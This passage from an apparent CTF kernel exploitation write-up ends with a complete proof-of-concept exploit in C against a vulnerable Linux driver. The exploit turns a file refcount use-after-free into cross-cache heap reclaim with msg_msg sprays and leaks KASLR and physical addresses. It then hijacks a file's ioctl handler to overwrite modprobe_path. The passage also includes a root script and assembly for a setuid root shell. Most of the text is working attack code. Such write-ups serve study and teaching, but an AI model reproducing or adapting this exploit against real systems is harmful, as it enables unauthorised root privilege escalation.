	LOG_INFO("Write pivot_gadget to pipe_buffer->page");
	uint64_t overwrite_gadget = KBASE_OFFSET(0x6a1040);
	for (int i = 0 ; i < ARR_LEN(pipefd) ; i++) {
		write(pipefd[i][1], &overwrite_gadget, sizeof(overwrite_gadget));
	}
	[...]
```

Now I will write the payload (fake `->f_op` table for RIP hijack of victim `struct file` object) in the `pipe_buffer` page. Now we know exactly where in memory is this fake fops table located.

> NOTE: The `write()` is appended, so the `overwrite_gadget` is after the inital "AAAABBBB" sent in the pipe (i.e., it will be at offset +8).

```c
	[...]
	// Reclaim with msg_msgseg and overwrite filp->ops = fake_ops
	ioctl(fd, FPUT);
	uint64_t modprobe_path = KBASE_OFFSET(0x188b200);
	LOG_INFO("Reclaim UAF obj with msg_msgseg");
	/*
	 * Offset of overwrite_gadget in page: +8
	 * Offset of f_op->unlocked_ioctl(): +0x50
	 */
	uint64_t fake_ops_addr = page_addr + 8 - 0x50;
	memset(mymsg.mtext, '\0', sizeof(mymsg.mtext));
	memcpy(&mymsg.mtext[PAGE_SIZE - sizeof(struct msg_msg) +
	       0x28 - sizeof(struct msg_msgseg)], &fake_ops_addr, sizeof(fake_ops_addr));
	memcpy(&mymsg.mtext[PAGE_SIZE - sizeof(struct msg_msg) +
	       0x38 - sizeof(struct msg_msgseg)], "\x01", 1);
	for (int i = 0 ; i < (sizeof secondary_msq / sizeof secondary_msq[0]) ; i++) {
		secondary_msq[i] = fetch_msq();
		msg_send(&mymsg, secondary_msq[i], PAGE_SIZE - sizeof(struct msg_msg) +
			 256 - sizeof(struct msg_msgseg));
	}
	[...]
```

Now I will repeat the same procedure of "free-reclaim-..." but this time I am not intending to overwrite `msg_msg`. Instead I am directly overwriting the victim `fd`'s `filp->f_op` with our `pipe_buffer` backed fake fops table. 

> We have overwritten the `->unlocked_ioctl()` handler since for this function we can provide any 2 arbitrary data values via `RSI` and `RDX` from userspace as part of IOCTL arguments.

> I tried to directly hijack RIP and do a [`retspill`](https://www.kylebot.net/slides/retspill.pdf) style attack, but I was unsuccessful due to random offset shifting (didn't investigate further). <br />
> Which is why I diverted my goal to overwriting `&modprobe_path` to run a root script.

```c
	[...]
	LOG_INFO("Overwriting modprobe_path with \"/t\" [1/3]");
	if (ioctl(tmp_fd[uaf_idx], 0x742f, modprobe_path) == -1)
		panic("ioctl failed");

	LOG_INFO("Overwriting modprobe_path with \"/tmp\" [2/3]");
	if (ioctl(tmp_fd[uaf_idx], 0x706d, modprobe_path+2) == -1)
		panic("ioctl failed");

	LOG_INFO("Overwriting modprobe_path with \"/tmp/a\" [3/3]");
	if (ioctl(tmp_fd[uaf_idx], 0x612f, modprobe_path+4) == -1)
		panic("ioctl failed");
	[...]
```

The `overwrite_gadget` used here is: `mov QWORD PTR [rdx], rsi`, where `rdx` would hold address of `&modprobe_path` and `rsi` will be bytes of "/tmp/a"

> NOTE: Since `rsi` in IOCTL gets reduced to `esi`, we can effectively only write upto 4-bytes at max. So we will need to chunk and repeat the write procedure.

At this point, we can consider doing `system("/tmp/bad")` to utilise overwritten `modprobe_path` to execute root script and get the flag, BUT there is a catch! If you do it now, the process (and possibly) the kernel will panic and crash.

The reason is that when you do `system()` (or `execve()`), the child process will obtain a copy of the parent's open file descriptors and when the child exits, the kernel will close those file descriptors. In our case, one of those file descriptors is the victim `tmp_fd` whose `f_op` table has been overwitten. Calling `close()` on that `fd` would cause a possible NULL-pointer-dereference and cause a kernel panic.

```c
void child()
{
	char *root_script = "#!/bin/sh\n"
			    "chown 0:1000 /tmp/rootsh\n"
			    "chmod +s /tmp/rootsh\n";
	char *bad_script = "\xff\xff\xff\xff";
	FILE *fp;
	fp = fopen("/tmp/a", "w");
	fwrite(root_script, strlen(root_script), sizeof(char), fp);
	fclose(fp);
	fp = fopen("/tmp/b", "w");
	fwrite(bad_script, strlen(bad_script), sizeof(char), fp);
	fclose(fp);
	fp = fopen("/tmp/rootsh", "w");
	fwrite(rootsh, rootsh_len, sizeof(rootsh[0]), fp);
	fclose(fp);
	if (chmod("/tmp/a", S_IRUSR | S_IWUSR | S_IXUSR |
	    S_IRGRP | S_IWGRP | S_IXGRP | S_IROTH | S_IWOTH | S_IXOTH) == -1)
		panic("failed to chmod /tmp/a");
	if (chmod("/tmp/b", S_IRUSR | S_IWUSR | S_IXUSR |
	    S_IRGRP | S_IWGRP | S_IXGRP | S_IROTH | S_IWOTH | S_IXOTH) == -1)
		panic("failed to chmod /tmp/b");
	if (chmod("/tmp/rootsh", S_IRUSR | S_IWUSR | S_IXUSR |
	    S_IRGRP | S_IWGRP | S_IXGRP | S_IROTH | S_IWOTH | S_IXOTH) == -1)
		panic("failed to chmod /tmp/b");
	LOG_INFO("[CHILD] Created all files");
	
	while (*start_child == 0)
		;

	LOG_SUCCESS("[CHILD] Took control");
	LOG_INFO("[CHILD] Executing root script");
	execve("/tmp/b", NULL, NULL);
	LOG_INFO("[CHILD] Done. Starting root shell");
	execve("/tmp/rootsh", NULL, NULL);

	hang();
}

int main(void)
{
	pin_to_cpu(0);

	start_child = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
			   MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	*start_child = 0;
	if (fork() == 0)
		child();
	
	[...]

	LOG_SUCCESS("Exploit done. modprobe_path overwritten");
	LOG_INFO("Handling control to child");
	*start_child = 1;

	hang();
```

A neat workaround is to spawn a new child thread before opening and file descriptors (basically a fresh copy of the process) and let it do the process-spawning part after the exploit is successfully completed.

PS: The goal is definitely achieved with execution of the root script but I wanted a root shell for satisfaction, so I ended up writing a mini setuid root shell binary as:

```asm
global _start

section .text

_start:
	; setuid(0)
	push 105
	pop rax
	xor rdi, rdi
	syscall
	; setgid(0)
	push 106
	pop rax
	xor rdi, rdi
	syscall
	; execve("/bin/busybox", ["/bin/busybox", "sh", NULL], NULL)
	xor rdi, rdi
	push rdi
	lea rdi, [rel sh]
	push rdi
	lea rdi, [rel busybox]
	push rdi
	push 59
	pop rax
	mov rsi, rsp
	xor rdx, rdx
	syscall

section .data

busybox:
	db "/bin/busybox", 0
sh:
	db "sh", 0
```

---

# PoC

## Full exploit

```c
#define _GNU_SOURCE
#include <fcntl.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include "kpwn/core.h"
#include "kpwn/log.h"
#include "kpwn/msg_msg.h"
#include "rootsh.h"

#define FGET 0xdead00
#define FPUT 0xdead01

/* Switches to CPU 1 for allocation of message queue */
int fetch_msq()
{
	pin_to_cpu(1);
	int ret = get_msq();
	pin_to_cpu(0);
	return ret;
}

volatile int *start_child;

void child()
{
	char *root_script = "#!/bin/sh\n"
			    "chown 0:1000 /tmp/rootsh\n"
			    "chmod +s /tmp/rootsh\n";
	char *bad_script = "\xff\xff\xff\xff";
	FILE *fp;
	fp = fopen("/tmp/a", "w");
	fwrite(root_script, strlen(root_script), sizeof(char), fp);
	fclose(fp);
	fp = fopen("/tmp/b", "w");
	fwrite(bad_script, strlen(bad_script), sizeof(char), fp);
	fclose(fp);
	fp = fopen("/tmp/rootsh", "w");
	fwrite(rootsh, rootsh_len, sizeof(rootsh[0]), fp);
	fclose(fp);
	if (chmod("/tmp/a", S_IRUSR | S_IWUSR | S_IXUSR |
	    S_IRGRP | S_IWGRP | S_IXGRP | S_IROTH | S_IWOTH | S_IXOTH) == -1)
		panic("failed to chmod /tmp/a");
	if (chmod("/tmp/b", S_IRUSR | S_IWUSR | S_IXUSR |
	    S_IRGRP | S_IWGRP | S_IXGRP | S_IROTH | S_IWOTH | S_IXOTH) == -1)
		panic("failed to chmod /tmp/b");
	if (chmod("/tmp/rootsh", S_IRUSR | S_IWUSR | S_IXUSR |
	    S_IRGRP | S_IWGRP | S_IXGRP | S_IROTH | S_IWOTH | S_IXOTH) == -1)
		panic("failed to chmod /tmp/b");
	LOG_INFO("[CHILD] Created all files");
	
	while (*start_child == 0)
		;

	LOG_SUCCESS("[CHILD] Took control");
	LOG_INFO("[CHILD] Executing root script");
	execve("/tmp/b", NULL, NULL);
	LOG_INFO("[CHILD] Done. Starting root shell");
	execve("/tmp/rootsh", NULL, NULL);

	hang();
}

int main(void)
{
	pin_to_cpu(0);

	start_child = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
			   MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	*start_child = 0;
	if (fork() == 0)
		child();

	LOG_INFO("Starting exploit...");
	int fd = open("/dev/vuln", O_RDONLY);
	LOG_INFO("fd = %d", fd);
	int tmp_fd[8 * 16];
	for (int i = 0 ; i < ARR_LEN(tmp_fd) ; i++) {
		tmp_fd[i] = open("/tmp/file", O_RDWR | O_CREAT, 0666);
	}

	int uaf_idx = 17;
	/* (unnecessarily, for us) increases refcount by 1 => 2 */
	ioctl(fd, FGET, tmp_fd[uaf_idx]);
	/* (neutralize) decreases refcount by 1 => 1 */
	ioctl(fd, FPUT);

	LOG_INFO("Freeing all tmp_fd[]");
	for (int i = 0 ; i < ARR_LEN(tmp_fd) ; i++) {
		if (i == uaf_idx) {
			ioctl(fd, FPUT); /* => 0 ... UAF */
			LOG_INFO("UAF object should be freed by now");
		} else {
			close(tmp_fd[i]);
		}
	}
	LOG_INFO("UAF page should be returned to buddy allocator");

	LOG_INFO("Spraying 0x100 msg_msg now");
	int primary_msq[32];
	for (int i = 0 ; i < (sizeof primary_msq / sizeof primary_msq[0]) ; i++) {
			primary_msq[i] = fetch_msq();
			sprintf(mymsg.mtext, "OLD_%d", i);
			memcpy(&mymsg.mtext[0x38 - sizeof(struct msg_msg)], "\x01", 1);
			msg_send(&mymsg, primary_msq[i], 256 - sizeof(struct msg_msg));
	}
	LOG_INFO("Done. Testing for successful cross-cache page reclaim");

	ioctl(fd, FPUT);
	LOG_INFO("Spraying segmented msg_msg now (for overlap)");
	int secondary_msq[32];
	struct msg_msg fake_msg;
	fake_msg.m_list.next = 0, /* cannot use */
	fake_msg.m_list.prev = 0,
	fake_msg.m_type = 1,
	fake_msg.m_ts = 0x1000,
	fake_msg.next = 0, /* can be used for arb read */
	fake_msg.security = 0,
	memcpy(&mymsg.mtext[PAGE_SIZE - sizeof(struct msg_msg)],
	       (char *)&fake_msg + 8, sizeof(fake_msg) - 8);
	memcpy(&mymsg.mtext[PAGE_SIZE - sizeof(struct msg_msg) +
	       0x38 - sizeof(struct msg_msgseg)], "\x01", 1);
	for (int i = 0 ; i < (sizeof secondary_msq / sizeof secondary_msq[0]) ; i++) {
		secondary_msq[i] = fetch_msq();
		/* LOG_INFO("new_msg_id[%d] = %d", i, new_msg_id[i]); */
		msg_send(&mymsg, secondary_msq[i], PAGE_SIZE - sizeof(struct msg_msg) +
			 256 - sizeof(struct msg_msgseg));
	}

	int idx = -1;
	int next_idx = -1;
	for (int i = 0 ; i < ARR_LEN(primary_msq) && idx == -1 ; i++) {
		msg_recv(&mymsg, primary_msq[i], sizeof(mymsg.mtext), MSG_COPY);
		int res;
		for (int j = 0x100 ; j < 0x1000 ; j += 0x100) {
			if (sscanf(&mymsg.mtext[j], "OLD_%d", &res) == 1) {
				idx = i;
				next_idx = res;
				break;
			}
		}
	}
	if (idx == -1 || next_idx == -1)
		panic("failed to find leak");	
	LOG_SUCCESS("Cross-cache reclaim successful");
	LOG_INFO("idx=%d, next_idx=%d", idx, next_idx);

	LOG_INFO("Sending 2nd msg in primary_msq[next_idx]");
	msg_send(&mymsg, primary_msq[next_idx], 512 - sizeof(struct msg_msg));
	LOG_INFO("Spraying pipe buffer now");
	int pipefd[8][2];
	for (int i = 0 ; i < ARR_LEN(pipefd) ; i++) {
		if (pipe(pipefd[i]) == -1)
			panic("failed to create pipe");
		/*
		 * 8 * PAGE_SIZE = 8 * object allocation = 8 * 0x40 sized ring buffer
		 * => ring buffer goes in kmalloc_cg_512
		 */
		if (fcntl(pipefd[i][0], F_SETPIPE_SZ, 8 * PAGE_SIZE) == -1)
			panic("failed to set pipe size");
		write(pipefd[i][1], "AAAABBBB", 8); /* populate pipe_buffer */
	}

	msg_recv(&mymsg, primary_msq[idx], sizeof(mymsg.mtext), MSG_COPY);
	uint64_t kmalloc_cg_512_addr = -1;
	for (int j = 0x100 ; j < 0x1000 ; j += 0x100) {
		int res;
		if (sscanf(&mymsg.mtext[j], "OLD_%d", &res) == 1) {
			if (res != next_idx) {
				LOG_INFO("[IGNORE] Found msq_id: %d (Expected: %d)", res, next_idx);
				continue;
			}
			kmalloc_cg_512_addr = *(uint64_t *)&mymsg.mtext[j - 0x30];
		}
	}
	if (kmalloc_cg_512_addr == -1)
		panic("failed to find kmalloc_cg_512 addr");
	LOG_INFO("kmalloc_cg_512 = %#lx", kmalloc_cg_512_addr);

	// Reclaim with msg_msgseg and overwrite fake msg_msg->next = kmalloc_cg_512
	ioctl(fd, FPUT);
	LOG_INFO("Reclaim UAF object with msg_msgseg");
	fake_msg.m_list.next = 0; /* unused */
	fake_msg.m_list.prev = 0;
	fake_msg.m_type = 1;
	fake_msg.m_ts = PAGE_SIZE - sizeof(struct msg_msg) +
			PAGE_SIZE - sizeof(struct msg_msgseg);
	fake_msg.next = (void *)kmalloc_cg_512_addr + sizeof(struct msg_msg) - 8;
	fake_msg.security = 0;
	memcpy(&mymsg.mtext[PAGE_SIZE - sizeof(struct msg_msg)],
	       (char *)&fake_msg + 8, sizeof(fake_msg) - 8);
	memcpy(&mymsg.mtext[PAGE_SIZE - sizeof(struct msg_msg) +
	       0x38 - sizeof(struct msg_msgseg)], "\x01", 1);
	for (int i = 0 ; i < (sizeof secondary_msq / sizeof secondary_msq[0]) ; i++) {
		secondary_msq[i] = fetch_msq();
		msg_send(&mymsg, secondary_msq[i], PAGE_SIZE - sizeof(struct msg_msg) +
			 256 - sizeof(struct msg_msgseg));
	}

	// Leak whole page => you get kASLR leak
	LOG_INFO("Leaking kmalloc_cg_512 page for kASLR leak");
	msg_recv(&mymsg, primary_msq[idx], sizeof(mymsg.mtext), MSG_COPY);
	UPDATE_KBASE(-1);
	uint64_t pipe_buffer_page;
	for (int i = PAGE_SIZE - sizeof(struct msg_msg) + 0x10 ;
	     i < sizeof(mymsg.mtext) ;
	     i += 0x10) {
		uint64_t addr = *(uint64_t *)&mymsg.mtext[i];
		if ((addr & 0xfff) == 0xc40) {
			UPDATE_KBASE(addr - 0x1242c40);
			pipe_buffer_page = *(uint64_t *)&mymsg.mtext[i - 0x10];
		}
	}
	if (KBASE == -1)
		panic("failed to find kbase");
	LOG_SUCCESS("KBASE @ %#lx", KBASE);
	LOG_INFO("pipe_buffer page @ %#lx", pipe_buffer_page);

	// Reclaim with msg_msgseg and overwrite fake msg_msg->next = base_offset_ptrs
	ioctl(fd, FPUT);
	uint64_t base_offset_ptrs = KBASE_OFFSET(0x16d7ff8);
	LOG_INFO("Reclaim UAF object with msg_msgseg");
	fake_msg.m_list.next = 0; /* unused */
	fake_msg.m_list.prev = 0;
	fake_msg.m_type = 1;
	fake_msg.m_ts = PAGE_SIZE - sizeof(struct msg_msg) +
			0x100 - sizeof(struct msg_msgseg);
	fake_msg.next = (void *)base_offset_ptrs; /* can be used for arb read */
	fake_msg.security = 0;
	memcpy(&mymsg.mtext[PAGE_SIZE - sizeof(struct msg_msg)],
	       (char *)&fake_msg + 8, sizeof(fake_msg) - 8);
	memcpy(&mymsg.mtext[PAGE_SIZE - sizeof(struct msg_msg) +
	       0x38 - sizeof(struct msg_msgseg)], "\x01", 1);
	for (int i = 0 ; i < (sizeof secondary_msq / sizeof secondary_msq[0]) ; i++) {
		secondary_msq[i] = fetch_msq();
		msg_send(&mymsg, secondary_msq[i], PAGE_SIZE - sizeof(struct msg_msg) +
			 256 - sizeof(struct msg_msgseg));
	}

	LOG_INFO("Leaking base_offset_ptrs for vmemmap_base & page_base_offset");
	msg_recv(&mymsg, primary_msq[idx], sizeof(mymsg.mtext), MSG_COPY);
	dump(&mymsg.mtext[PAGE_SIZE - sizeof(struct msg_msg)], 0x20);
	int vmemmap_base_index = PAGE_SIZE - sizeof(struct msg_msg);
	int page_offset_base_index = PAGE_SIZE - sizeof(struct msg_msg) + 0x10;
	uint64_t vmemmap_base = *(uint64_t *)&mymsg.mtext[vmemmap_base_index];
	uint64_t page_base_offset = *(uint64_t *)&mymsg.mtext[page_offset_base_index];
	LOG_SUCCESS("vmemmap_base @ %#lx", vmemmap_base);
	LOG_SUCCESS("page_base_offset @ %#lx", page_base_offset);

	/* sizeof(struct page) = 0x40 */
	int pfn = (pipe_buffer_page - vmemmap_base) / 0x40;
	LOG_INFO("pfn = %#x", pfn);
	uint64_t page_addr = page_base_offset + pfn * PAGE_SIZE;
	LOG_INFO("physical address = %#lx", page_addr);

	LOG_INFO("Write pivot_gadget to pipe_buffer->page");
	uint64_t overwrite_gadget = KBASE_OFFSET(0x6a1040);
	for (int i = 0 ; i < ARR_LEN(pipefd) ; i++) {
		write(pipefd[i][1], &overwrite_gadget, sizeof(overwrite_gadget));
	}

	// Reclaim with msg_msgseg and overwrite filp->ops = fake_ops
	ioctl(fd, FPUT);
	uint64_t modprobe_path = KBASE_OFFSET(0x188b200);
	LOG_INFO("Reclaim UAF obj with msg_msgseg");
	/*
	 * Offset of overwrite_gadget in page: +8
	 * Offset of f_op->unlocked_ioctl(): +0x50
	 */
	uint64_t fake_ops_addr = page_addr + 8 - 0x50;
	memset(mymsg.mtext, '\0', sizeof(mymsg.mtext));
	memcpy(&mymsg.mtext[PAGE_SIZE - sizeof(struct msg_msg) +
	       0x28 - sizeof(struct msg_msgseg)], &fake_ops_addr, sizeof(fake_ops_addr));
	memcpy(&mymsg.mtext[PAGE_SIZE - sizeof(struct msg_msg) +
	       0x38 - sizeof(struct msg_msgseg)], "\x01", 1);
	for (int i = 0 ; i < (sizeof secondary_msq / sizeof secondary_msq[0]) ; i++) {
		secondary_msq[i] = fetch_msq();
		msg_send(&mymsg, secondary_msq[i], PAGE_SIZE - sizeof(struct msg_msg) +
			 256 - sizeof(struct msg_msgseg));
	}

	LOG_INFO("Overwriting modprobe_path with \"/t\" [1/3]");
	if (ioctl(tmp_fd[uaf_idx], 0x742f, modprobe_path) == -1)
		panic("ioctl failed");

	LOG_INFO("Overwriting modprobe_path with \"/tmp\" [2/3]");
	if (ioctl(tmp_fd[uaf_idx], 0x706d, modprobe_path+2) == -1)
		panic("ioctl failed");

	LOG_INFO("Overwriting modprobe_path with \"/tmp/a\" [3/3]");
	if (ioctl(tmp_fd[uaf_idx], 0x612f, modprobe_path+4) == -1)
		panic("ioctl failed");

	LOG_SUCCESS("Exploit done. modprobe_path overwritten");
	LOG_INFO("Handling control to child");
	*start_child = 1;

	hang();
}
```

## Demo

[![asciicast](https://asciinema.org/a/SvnQvhxmUrdFsUQF.svg)](https://asciinema.org/a/SvnQvhxmUrdFsUQF)